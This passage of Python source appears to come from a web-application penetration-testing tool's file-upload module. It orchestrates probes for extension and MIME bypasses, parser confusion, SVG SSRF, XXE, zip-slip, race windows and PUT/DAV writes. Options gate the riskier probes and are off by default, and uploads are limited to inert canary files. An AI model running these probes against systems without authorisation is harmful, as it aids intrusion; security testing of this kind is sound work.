    ok("upload engine: %d endpoints -> %s" % (len(upload_recs),
                                              {r["verdict"] for r in
                                               upload_recs}))

    # findings (upload)
    def fadd(key, title, endpoint, detail, ev_ref="", cap_per_key=4):
        if sum(1 for x in F.items if x["key"] == key) >= cap_per_key:
            return
        F.add(key, title, endpoint, detail, ev_ref)

    for r in upload_recs:
        if r.get("served_exec"):
            fadd("upload_exec_content_type", "Uploaded file exec-CT se serve "
                 "ho rahi hai", r["url"],
                 "%s - %s" % (r.get("served_exec")[:2],
                              r.get("technique", "")),
                 "serve_matrix.json")
        if r.get("technique") == "upload-risky-ext-accepted" or \
                (r.get("accepted_risky") and r.get("verdict") == "CONFIRMED"):
            fadd("upload_risky_ext_accepted", "Executable extension accepted "
                 "(%s)" % ",".join(r.get("accepted_risky", [])[:3]), r["url"],
                 "INERT content par bhi server-side ext accept - whitelist "
                 "missing", "upload_matrix.json")
        if any(s.startswith("filename-traversal") for s in r.get("signals", [])):
            fadd("upload_filename_traversal", "Filename traversal accepted",
                 r["url"], "%s - upload path attacker-controlled" %
                 r.get("signals", []), "upload_matrix.json")
        if r.get("technique") == "upload-no-validation":
            fadd("upload_no_validation", "No server-side upload validation",
                 r["url"], "sab variants accept hue", "upload_matrix.json")
        if r.get("technique") == "upload-extension-blacklist":
            fadd("upload_extension_blacklist", "Blacklist-style filtering",
                 r["url"], "kuch variants reject, baaki accept - bypass-prone",
                 "upload_matrix.json")
        if r.get("ct_spoof_accepted"):
            fadd("upload_mime_bypass", "Content-Type spoof accepted", r["url"],
                 "%s" % r.get("ct_spoof_accepted"), "ct_matrix.json")
        if "magic-missing" in r.get("signals", []):
            fadd("upload_magic_missing", "Magic-byte check absent", r["url"],
                 "GIF89a-as-png INERT differential", "magic_matrix.json")
        if r.get("overwrite_probe", {}).get("overwritten"):
            fadd("upload_overwrite_possible", "Same-name overwrite possible",
                 r["url"], "canary overwrite differential",
                 "upload_matrix.json")
        if r.get("form_accept") and r.get("accepted_risky"):
            fadd("upload_client_only_filter", "Client-side-only upload filter",
                 r["url"], "form accept-hints=%s par server risky extensions "
                 "bhi accept karta hai (client enforcement gap)"
                 % r.get("form_accept"), "upload_matrix.json", cap_per_key=2)
        if r.get("anon_getback", {}).get("served"):
            fadd("upload_unauth_accessible", "Uploaded file anon-accessible",
                 r["url"], "anonymous GET-back + content match (P11 handoff)",
                 "getback_matrix.json")
        if r.get("verdict") == "HARDENED":
            fadd("upload_hardened", "Upload hardening present", r["url"],
                 "whitelist/reject behaviour - positive signal",
                 "upload_matrix.json", cap_per_key=2)

    # ---------------- Stage C2: deep-dive engines (v17 ULTRA) ----------------
    deep_recs = []
    deep_cap = int(conf.get("files_deep_endpoints", 3))
    deep_pool = [r for r in upload_recs if r.get("param") and
                 r.get("verdict") in ("CONFIRMED", "SUSPECTED",
                                      "HARDENED")][:deep_cap]
    if not deep_pool:
        deep_pool = [r for r in upload_recs if r.get("param")][:1]
    if deep_pool:
        head("Stage C2 - Deep-dive (ext-model + parser-confusion + "
             "magic-consistency + client-bypass + exotic census)")
        for rec in deep_pool:
            ck = "c2:%s" % rec["url"]
            if cp.is_done(ck):
                d2 = cp.result_of(ck) or {}
            else:
                d2 = {}
                url = rec["url"]
                fields = rec.get("fields") or []
                form = form_by_url.get(url.split("?")[0])
                if conf.get("files_ext_matrix", True):
                    d2["ext_model"] = ext_acceptance_matrix(
                        http, url, rec["param"], fields, rec["canary"],
                        meta, conf)
                if conf.get("files_multipart_confusion", True):
                    d2["confusion"] = multipart_confusion_probe(
                        http, url, rec["param"], fields, rec["canary"],
                        meta, conf)
                if conf.get("files_magic_consistency", True):
                    d2["magic_consistency"] = magic_consistency_probe(
                        http, url, rec["param"], fields, rec["canary"],
                        meta, conf)
                if conf.get("files_client_bypass", True):
                    d2["client_bypass"] = client_bypass_probe(
                        http, url, rec["param"], fields, form,
                        rec["canary"], meta, conf)
                if conf.get("files_exotic_census", True):
                    d2["exotic"] = exotic_format_census(
                        http, url, rec["param"], fields, rec["canary"],
                        meta, conf)
                cp.mark(ck, d2, summary="deep %s" % rec["url"][:40])
            rec["deep"] = d2
            deep_recs.append({"url": rec["url"]})
            deep_recs[-1].update(d2)
            print("  [deep] %s -> ext=%s parser=%s inspect=%s" % (
                rec["url"][:48],
                (d2.get("ext_model") or {}).get("model"),
                (d2.get("confusion") or {}).get("parser_signal"),
                (d2.get("magic_consistency") or {}).get(
                    "inspection_depth")))
            if interrupted():
                warn("Interrupt - clean stop (resume karo).")
                break
        results_by_stage["deep"] = {"data": deep_recs}
        ok("deep-dive: %d endpoints -> models=%s" % (
            len(deep_recs),
            [(d.get("ext_model") or {}).get("model") for d in deep_recs]))
    else:
        info("deep-dive skip: koi param-verified upload endpoint nahi")

    # deep-dive findings
    for d in deep_recs:
        em = d.get("ext_model") or {}
        if em.get("model") == "no-validation":
            fadd("upload_ext_no_validation",
                 "Extension model: no-validation", d["url"],
                 "risky + benign sab accept (ext acceptance matrix)",
                 "ext_acceptance_matrix.json")
        elif em.get("model") == "blacklist-gapped":
            fadd("upload_ext_blacklist_gapped",
                 "Blacklist gaps (%s)" % ",".join(
                     em.get("risky_accepted", [])[:4]), d["url"],
                 "reject-set + risky-accept mix - bypass-prone",
                 "ext_acceptance_matrix.json")
        if em.get("hints"):
            fadd("upload_server_tech_hints", "Ext-reject pattern hints",
                 d["url"], "%s" % em.get("hints"),
                 "ext_acceptance_matrix.json", cap_per_key=2)
        cf = d.get("confusion") or {}
        if cf.get("parser_signal") == "parser-lenient":
            fadd("upload_parser_lenient", "Multipart parser lenient",
                 d["url"], "%d/%d confusion variants accepted" % (
                     len(cf.get("accepted", [])),
                     len(cf.get("rows", []))),
                 "multipart_matrix.json")
        mc = d.get("magic_consistency") or {}
        if mc.get("inspection_depth") == "no-content-inspection":
            fadd("upload_magic_consistency_missing",
                 "No content inspection (magic mismatches pass)", d["url"],
                 "%s" % mc.get("accepted", [])[:3],
                 "magic_consistency.json")
        cb = d.get("client_bypass") or {}
        if cb.get("client_only_limit"):
            fadd("upload_client_only_limit",
                 "MAX_FILE_SIZE client-side only", d["url"],
                 "server-accepted sizes=%s vs client limit=%s" % (
                     [x.get("size") for x in cb.get("rows", [])
                      if x.get("probe") == "over-max-file-size"],
                     cb.get("max_file_size")),
                 "client_bypass_matrix.json", cap_per_key=2)
        if cb.get("client_only_accept"):
            fadd("upload_client_only_accept",
                 "accept= hint client-side only", d["url"],
                 "hint-ke-bahar extension bhi server-accept",
                 "client_bypass_matrix.json", cap_per_key=2)
        ex = d.get("exotic") or {}
        if ex.get("office_accepted"):
            fadd("upload_office_formats",
                 "Office formats accepted (xlsx/odt/docx)", d["url"],
                 "import/parser surface - P15 chain handoff",
                 "exotic_formats.json", cap_per_key=2)
        if ex.get("html_accepted"):
            fadd("upload_html_accepted", "HTML upload accepted", d["url"],
                 "stored-HTML serve risk (serve-CT analysis dekho)",
                 "exotic_formats.json", cap_per_key=2)

    # ---------------- Stage C3: gated probes (svg-ssrf / race) ----------------
    head("Stage C3 - Gated probes (svg-ssrf=%s | race=%s)" % (
        bool(conf.get("files_allow_svg_ssrf")),
        bool(conf.get("files_allow_race"))))
    if conf.get("files_allow_svg_ssrf") and deep_pool:
        for rec in deep_pool[:2]:
            ck = "c3svg:%s" % rec["url"]
            if cp.is_done(ck):
                ss = cp.result_of(ck)
            else:
                ss = svg_ssrf_probe(http, rec["url"], rec["param"],
                                    rec.get("fields") or [], rec["canary"],
                                    meta, conf)
                cp.mark(ck, ss, summary=ss.get("signal", ""))
            rec["deep"]["svg_ssrf"] = ss
            for d in deep_recs:
                if d["url"] == rec["url"]:
                    d["svg_ssrf"] = ss
            if ss.get("differential"):
                fadd("upload_svg_rasterizer",
                     "SVG rasterizer fetch differential", rec["url"],
                     "same-origin <image href> status/len/latency diff - "
                     "P15 SSRF chain handoff", "svg_ssrf_matrix.json")
            print("  [svg-ssrf] %s -> %s" % (rec["url"][:48],
                                             ss.get("signal")))
    else:
        info("svg-ssrf gate OFF (files_allow_svg_ssrf=false) - INERT svg "
             "payload upload_payloads/ ready")
    if conf.get("files_allow_race") and deep_pool:
        rec = deep_pool[0]
        ck = "c3race:%s" % rec["url"]
        if cp.is_done(ck):
            rr = cp.result_of(ck)
        else:
            rr = race_window_probe(http, rec["url"], rec["param"],
                                   rec.get("fields") or [], rec["canary"],
                                   meta, conf)
            cp.mark(ck, rr, summary=rr.get("signal", ""))
        rec["deep"]["race"] = rr
        for d in deep_recs:
            if d["url"] == rec["url"]:
                d["race"] = rr
        if rr.get("signal") in ("all-concurrent-succeeded",
                                "partial-accept"):
            fadd("upload_race_window_hypothesis",
                 "Race-window hypothesis (%s)" % rr.get("signal"),
                 rec["url"], "N=%s concurrent same-name canaries - TOCTOU "
                 "manual confirm" % rr.get("threads"),
                 "race_analysis.json")
        print("  [race] %s -> %s" % (rec["url"][:48], rr.get("signal")))
    else:
        info("race gate OFF (files_allow_race=false)")

    # ---------------- Stage D: getback sweep + listing ----------------
    head("Stage D - Getback/serve sweep + dir-listing census")
    located = []
    for r in upload_recs:
        located.extend(r.get("located_urls", []))
    listings = []
    if located:
        ckL = "listing:%s" % located[0]
        if cp.is_done(ckL):
            listings = cp.result_of(ckL) or []
        else:
            listings = listing_probe(http, located, base_url, meta, conf)
            cp.mark(ckL, listings, summary="dirs=%d" % len(listings))
    for d in listings:
        if d.get("listing"):
            fadd("upload_dir_listing", "Upload dir listing enabled", d["dir"],
                 "file hrefs=%s" % d.get("file_hrefs", "?"),
                 "dir_listing_matrix.json")
    results_by_stage["listing"] = {"data": listings}
    ok("listing: %d dirs -> %d listing-enabled" % (len(listings),
                                                   sum(1 for d in listings
                                                       if d.get("listing"))))

    # ---------------- Stage D2: metadata + storage fingerprint (v17) ----------------
    head("Stage D2 - Metadata/pipeline + storage fingerprint + rename policy")
    if conf.get("files_metadata", True) and deep_pool:
        for rec in deep_pool:
            ck = "d2meta:%s" % rec["url"]
            if cp.is_done(ck):
                md = cp.result_of(ck)
            else:
                md = metadata_probe(http, rec["url"], rec["param"],
                                    rec.get("fields") or [], base_url,
                                    rec["canary"], meta, conf)
                cp.mark(ck, md, summary="meta transformed=%s"
                        % md.get("transformed"))
            rec["deep"]["metadata"] = md
            for d in deep_recs:
                if d["url"] == rec["url"]:
                    d["metadata"] = md
            if md.get("transformed"):
                fadd("upload_image_transformed",
                     "Server transforms images (dims changed)", rec["url"],
                     "PNG IHDR differential - processing pipeline present "
                     "(Imagick/GD surface = MANUAL)", "metadata_matrix.json")
            if md.get("stripped"):
                fadd("upload_metadata_stripped",
                     "Metadata stripped on ingest", rec["url"],
                     "canary text chunk removed - re-encode pipeline",
                     "metadata_matrix.json")
            acc_rows = [x for x in md.get("rows", []) if x.get("accepted")]
            if acc_rows and all(x.get("canary_survived")
                                for x in acc_rows):
                fadd("upload_metadata_preserved",
                     "Metadata preserved end-to-end", rec["url"],
                     "EXIF/metadata chain surface (viewer-dependent "
                     "= MANUAL)", "metadata_matrix.json")
    else:
        info("metadata probe OFF/empty (files_metadata=%s)"
             % conf.get("files_metadata", True))
    if conf.get("files_storage_fp", True):
        sfp_recs = []
        for rec in upload_recs:
            if len(sfp_recs) >= 5 or not rec.get("located_urls"):
                continue
            try:
                rg = http.get(rec["located_urls"][0], allow_redirects=False)
                meta["probes_total"] = meta.get("probes_total", 0) + 1
                sfp = storage_fingerprint(
                    rg, rec["located_urls"],
                    "%s.png" % (rec.get("canary") or "").lower())
            except Exception as e:
                sfp = {"error": truncate(str(e), 60)}
            sfp["url"] = rec["url"]
            sfp_recs.append(sfp)
        rp = rename_policy_analysis(upload_recs)
        results_by_stage["storage"] = {"data": sfp_recs,
                                       "rename_policy": rp}
        ok("storage-fp: %d backends sampled | rename=%s (enum_risk=%s)"
           % (len(sfp_recs), rp.get("policy"), rp.get("enumeration_risk")))
        if rp.get("enumeration_risk") and upload_recs:
            fadd("upload_storage_enumeration",
                 "Storage names predictable (%s)" % rp.get("policy"),
                 upload_recs[0]["url"],
                 "rename-policy enumeration risk - P20 logic chain",
                 "rename_policy.json")

    # ---------------- Stage E: import/XXE engine (gated) ----------------
    head("Stage E - Import engine (svg/docx; xxe gate=%s)"
         % bool(conf.get("files_allow_import_xxe")))
    import_recs = []
    imp_pool = imp_targets[:6] or [
        {"kind": "import", "url": u, "param": "file"} for u in
        meta.get("svg_endpoints", [])[:4]]
    for i, t in enumerate(imp_pool, 1):
        ck = "import:%s" % t["url"]
        if cp.is_done(ck):
            rec = cp.result_of(ck)
        else:
            rec = import_probe_endpoint(http, qhttp, t, base_url, meta, conf,
                                        cp,
                                        allow_xxe=bool(conf.get(
                                            "files_allow_import_xxe")))
            cp.mark(ck, rec, summary="%s" % rec.get("verdict", ""))
        import_recs.append(rec)
        print("  [%d/%d] %s %s" % (i, len(imp_pool), rec["verdict"],
                                   t["url"][:64]))
    for r in import_recs:
        if r.get("verdict") == "CONFIRMED":
            fadd("upload_import_xxe", "Import parser XXE (%s)"
                 % r.get("technique", ""), r["url"],
                 "parser ne entity process kiya (content redacted)",
                 "import_xxe_matrix.json")
        elif r.get("verdict") == "SKIPPED":
            fadd("upload_gate_skipped", "Import XXE RoE-gated (skipped)",
                 r["url"], "files_allow_import_xxe=false - INERT payloads "
                 "upload_payloads/ ready", "import_xxe_matrix.json",
                 cap_per_key=1)
    results_by_stage["import"] = {"data": import_recs}
    ok("import: %d endpoints -> %s" % (len(import_recs),
                                       {r["verdict"] for r in import_recs}))

    # ---------------- Stage F: archive (gated) ----------------
    head("Stage F - Archive engine (zip-slip gate=%s)"
         % bool(conf.get("files_allow_archive")))
    archive_recs = []
    arch_pool = [{"kind": "archive", "url": t["url"]}
                 for t in upload_recs
                 if t.get("verdict") in ("CONFIRMED", "SUSPECTED")][:2]
    if not arch_pool and up_pool:
        arch_pool = [{"kind": "archive", "url": up_pool[0]["url"]}]
    for t in arch_pool:
        ck = "archive:%s" % t["url"]
        if cp.is_done(ck):
            rec = cp.result_of(ck)
        else:
            rec = archive_probe_endpoint(http, t, base_url, meta, conf,
                                         allow_archive=bool(conf.get(
                                             "files_allow_archive")))
            cp.mark(ck, rec, summary="%s" % rec.get("verdict", ""))
        archive_recs.append(rec)
        if rec.get("slip_reflected"):
            fadd("upload_zip_slip", "Zip-slip signal (entry reflected)",
                 t["url"], "INERT ../ entry differential - manual confirm",
                 "archive_matrix.json")
    results_by_stage["archive"] = {"data": archive_recs}

    # ---------------- Stage F2: PUT/DAV engine (v17, OPTIONS ungated) ----------------
    head("Stage F2 - PUT/DAV census (put-gate=%s)"
         % bool(conf.get("files_allow_put_method")))
    put_recs = []
    dirs_seen = []
    for d in listings:
        if d.get("dir"):
            dirs_seen.append(d["dir"])
    for r in upload_recs:
        for u in (r.get("located_urls") or [])[:1]:
            dr = u.rsplit("/", 1)[0] + "/"
            if dr not in dirs_seen:
                dirs_seen.append(dr)
    for du in dirs_seen[:int(conf.get("files_list_dirs", 6))]:
        ck = "f2put:%s" % du
        if cp.is_done(ck):
            pr = cp.result_of(ck)
        else:
            pr = put_method_probe(http, du, _canary("put"), meta,
                                  allow_put=bool(conf.get(
                                      "files_allow_put_method")))
            cp.mark(ck, pr, summary="dav=%s" % pr.get("dav_allowed"))
        put_recs.append(pr)
        if pr.get("put_write"):
            fadd("upload_dav_put_write",
                 "DAV/PUT webroot write possible", du,
                 "INERT canary PUT + GET-back verified - critical",
                 "put_method_matrix.json")
        elif pr.get("dav_allowed"):
            fadd("upload_dav_put_census",
                 "PUT/DAV advertised%s" % ("" if
                                           conf.get("files_allow_put_method")
                                           else " (write gate OFF)"), du,
                 "OPTIONS Allow/DAV header census",
                 "put_method_matrix.json", cap_per_key=3)
    results_by_stage["put"] = {"data": put_recs}
    ok("put/dav: %d dirs -> dav=%s write=%s" % (
        len(put_recs),
        sum(1 for p in put_recs if p.get("dav_allowed")),
        sum(1 for p in put_recs if p.get("put_write"))))

    # ---------------- Stage G: cleanup (gated) ----------------
    head("Stage G - Cleanup (DELETE gate=%s) + hygiene"
         % bool(conf.get("files_allow_cleanup")))
    if conf.get("files_allow_cleanup"):
        for r in upload_recs[:3]:
            if r.get("located_urls"):
                res = cleanup_attempt(http, r["url"], r["located_urls"], meta)
                r["cleanup"] = res
                ok("cleanup: %s" % [(x.get("status"), x.get("deleted"))
                                    for x in res])
    else:
        info("cleanup gate OFF - canary files target par rahengi (waspP16 "
             "grep karo, manual DELETE karo)")

    # ---------------- Stage H: differential ----------------
    head("Stage H - Differential summary")
    diff = differential_summary(upload_recs, import_recs, archive_recs, conf)
    results_by_stage["differential"] = {"data": diff}
    ok("differential: confirmed=%d suspected=%d hardened=%d blocked=%d"
       % (diff["confirmed"], diff["suspected"], diff["hardened"],
          diff["blocked"]))

    # ---------------- Stage I: technique matrix ----------------
    head("Stage I - Technique matrix (45 rows; MANUAL/FORBIDDEN documented)")
    tm = build_technique_matrix(upload_recs, import_recs, archive_recs,
                                listings, conf,
                                deep=results_by_stage.get("deep", {}).get(
                                    "data", []),
                                put_recs=results_by_stage.get("put", {}).get(
                                    "data", []),
                                storage_stage=results_by_stage.get(
                                    "storage", {}))
    results_by_stage["techniques"] = {"data": tm}
    ok("technique matrix: %d rows" % len(tm))

    # ---------------- Stage J: chains & hypotheses ----------------
    head("Stage J - Kill-chains & manual-wave hypotheses")
    chains = build_files_chains(F, upload_recs, import_recs, archive_recs,
                                listings,
                                put_recs=results_by_stage.get(
                                    "put", {}).get("data", []))
    ctx["chains"] = chains
    hyps = build_files_hypotheses(upload_recs, import_recs, archive_recs, conf)
    for c in chains:
        ok("CHAIN: %s [%s]" % (c["name"], c["severity"]))

    # ---------------- Stage K: reports ----------------
    head("Stage K - Reports (findings / matrices / INERT payloads / catalog)")
    ctx["coverage"]["probes"] = meta.get("probes_total", 0)
    write_reports(out, scope, F, ctx, meta, results_by_stage, hyps, ranked,
                  chains, conf)
    dur = time.time() - t_start
    ok("Phase 16 done: %d findings | %d probes | %.1fs | out=%s"
       % (len(F.items), meta.get("probes_total", 0), dur, out))
    return out


# ===========================================================================
# CLI (standalone entry - wasp.py ke through hi chalna recommended)
# ===========================================================================
def main():
    print("WASP mod_files.py (Phase 16 - File Upload, v%s)" % PLAN_VERSION)
    print("  run       : python3 wasp.py run --module 16   (ya --module files)")
    print("  self-test : python3 test_mod_files.py")
    print("\n  RoE gates (config.json): files_allow_import_xxe=false (default),"
          " files_allow_archive=false (default), files_allow_cleanup=false "
          "(default)")
    print("  Safety: 100% INERT uploads (webshell/htaccess FORBIDDEN-AUTO) | "
          "canary names | getback content REDACTED | zip-bomb kabhi nahi")


if __name__ == "__main__":
    main()
